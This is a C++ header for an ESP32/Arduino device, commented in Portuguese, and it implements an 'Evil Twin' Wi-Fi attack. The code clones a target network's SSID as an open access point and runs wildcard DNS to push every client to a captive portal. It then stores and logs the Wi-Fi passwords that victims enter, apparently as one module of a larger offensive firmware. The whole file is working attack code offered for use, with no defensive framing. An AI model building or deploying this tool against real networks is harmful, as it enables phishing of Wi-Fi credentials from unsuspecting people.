#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <vector>
#include "../utils/logger.h"

struct CapturedCred {
    String ssid;
    String password;
    String ip;
    unsigned long ts;
};

class EvilTwin {
public:
    static EvilTwin& get() { static EvilTwin inst; return inst; }

    bool running = false;
    String clonedSSID;
    std::vector<CapturedCred> captured;

    // Inicia AP clone com captive portal
    void start(const String& ssid, uint8_t channel) {
        if (running) stop();
        clonedSSID = ssid;

        // AP aberto imitando o alvo
        WiFi.softAP(ssid.c_str(), nullptr, channel);
        delay(500);

        // DNS wildcard → redireciona tudo para o portal
        _dns.start(53, "*", WiFi.softAPIP());

        running = true;
        LOG.warn("Evil Twin ativo: \"" + ssid + "\" ch" + String(channel));
        LOG.info("Portal captive em http://" + WiFi.softAPIP().toString());
    }

    void stop() {
        _dns.stop();
        WiFi.softAPdisconnect(true);
        running = false;
        LOG.info("Evil Twin parado. Credenciais capturadas: " + String(captured.size()));
    }

    void tick() {
        if (running) _dns.processNextRequest();
    }

    void addCred(const String& ssid, const String& pass, const String& ip) {
        CapturedCred c{ ssid, pass, ip, millis() };
        captured.push_back(c);
        LOG.success("CRED CAPTURADA → SSID:" + ssid + " PASS:" + pass + " IP:" + ip);
    }

    DNSServer& dns() { return _dns; }

private:
    DNSServer _dns;
};
